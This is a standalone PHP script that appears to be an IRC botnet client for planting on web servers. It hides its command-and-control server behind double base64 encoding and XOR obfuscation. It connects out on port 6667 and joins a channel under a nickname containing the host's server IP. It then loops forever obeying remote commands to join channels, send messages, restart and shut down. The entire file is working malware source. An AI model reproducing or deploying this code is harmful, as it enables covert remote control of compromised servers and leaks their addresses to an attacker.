<?php

set_time_limit(0);
ini_set('display_errors', 'on');



$config = array( 
        'server' => snowden('UFVZSFQwb3NXMXNuRWxCYg=='), 
        'port'   => 6667, 
        'channel' => snowden('#butt'),
        'name'   => snowden('buttBot_').$_SERVER['SERVER_ADDR'], 
        'nick'   => snowden('buttBot_').$_SERVER['SERVER_ADDR'], 
        'pass'   => snowden(''), 
);


                                 
function snowden($string) {

 $white = base64_decode(base64_decode('VkRSa1lTTmVPQ2hJWnp3aA=='));
 $text = base64_decode(base64_decode($string));
 $black = '';

 for($i=0,$j=0;($i<strlen($text) && $j<strlen($white));$i++,$j++)
 {
         $black .= $text{$i} ^ $white{$j};
 }

 return $black;
}
class buttBOT {

        var $socket;

        var $buf = array();

        // @param array
        function __construct($config)

        {
                $this->socket = fsockopen($config['server'], $config['port']);
                $this->login($config);
                $this->main($config);
        }



         //@param array

        function login($config)
        {
                $this->send_data('USER', $config['nick'].' null '.$config['nick'].' :'.$config['name']);
                $this->send_data('NICK', $config['nick']);
		$this->join_channel($config['channel']);
        }




        function main($config)
        {             
                $data = fgets($this->socket, 256);
                
                echo nl2br($data);
				
                flush();

                $this->buf = explode(' ', $data);


                if($this->buf[0] == 'PING')
                {
                        $this->send_data('PONG', $this->buf[1]); 
                }

                $command = str_replace(array(chr(10), chr(13)), '', $this->buf[3]);

                switch($command) 
                {                      
                        case ':!join':
                                $this->join_channel($this->buf[4]);
                                break;                     
                        case ':!part':
                                $this->send_data('PART '.$this->buf[4].' :', 'welcome to buttnet');
                                break;   
                                                                 
                        case ':!say':
                                $message = "";
                                for($i=5; $i <= (count($this->buf)); $i++)
                                {
                                        $message .= $this->buf[$i]." ";
                                }
                                
                                $this->send_data('PRIVMSG '.$this->buf[4].' :', $message);
                                break;                        		
                        
                        case ':!restart':
                                echo "<meta http-equiv=\"refresh\" content=\"5\">";
                                exit;
                        case ':!shutdown':
                        		$this->send_data('QUIT', 'we out');
                                exit;
                }

                $this->main($config);
        }



        function send_data($cmd, $msg = null) 
        {
                if($msg == null)
                {
                        fputs($this->socket, $cmd."\r\n");
                } else {

                        fputs($this->socket, $cmd.' '.$msg."\r\n");
                }

        }



        function join_channel($channel) 
        {

                if(is_array($channel))
                {
                        foreach($channel as $chan)
                        {
                                $this->send_data('JOIN', $chan);
                        }

                } else {
                        $this->send_data('JOIN', $channel);
                }
        }     
}

$bot = new buttBOT($config);
?>
